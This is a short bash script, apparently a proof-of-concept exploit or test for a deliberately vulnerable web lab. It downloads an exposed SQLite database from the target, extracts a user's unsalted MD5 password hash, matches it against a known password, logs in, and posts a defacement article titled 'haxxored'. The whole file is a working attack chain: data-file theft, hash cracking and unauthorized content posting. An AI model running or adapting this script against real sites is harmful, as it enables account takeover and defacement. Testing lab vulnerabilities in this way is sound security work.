#!/bin/bash -eu
BASE=$1

USER=bob
PASSWORD=joker555

echo "Downloading database file..."
curl "http://${BASE}/files123/data.db" -o data.db 2>/dev/null
echo -n "Getting password hash for user '${USER}'... "
HASH=$(sqlite3 data.db "select password from users where username='${USER}'")
echo "found hash."

rm -f data.db

echo -n "Getting password for hash... "
HASH_KNOWN=$(md5sum <(echo -n ${PASSWORD}) | sed 's/ .*//')
if [ "${HASH}" != "${HASH_KNOWN}" ] ; then
    echo "hash does not match rainbow table!"
    echo -e "\033[31mError: this should have worked!\033[0m"
else
    echo "hash matches rainbow table!"

    echo "Logging in as user '${USER}'..."
    curl -X POST -c cookies.txt "http://${BASE}/post.php" -d "form=login" -d "username=${USER}" -d "password=${PASSWORD}"
    echo "Posting new article..."
    curl -X POST -b cookies.txt "http://${BASE}/post.php" -d "form=content" -d "type=1" -d "title=haxxored" -d "content=ALLYOURBASEAREBELONGTOUS"
    echo -e "\033[32mDone!\033[0m"

    rm -f cookies.txt
fi
